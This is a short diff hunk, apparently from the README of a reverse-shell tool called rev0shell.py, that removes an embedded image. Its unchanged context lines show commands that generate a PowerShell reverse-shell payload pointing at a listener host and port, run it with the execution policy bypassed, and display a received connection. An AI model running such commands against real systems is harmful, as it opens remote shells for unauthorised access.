@@ -118,8 +118,6 @@ python rev0shell.py --lhost 192.168.1.6 --lport 4444 --generate --output shell.p
 # Execute in controlled lab
 powershell -ExecutionPolicy Bypass -File shell.ps1
 
-<img width="800" height="450" alt="Image" src="https://github.com/user-attachments/assets/3e39a724-e82b-46da-bf06-5c5adace596b" />
-
 # Expected output
 [*] Listening on 192.168.1.6:4444
 [+] Connection received from 192.168.1.105:49732
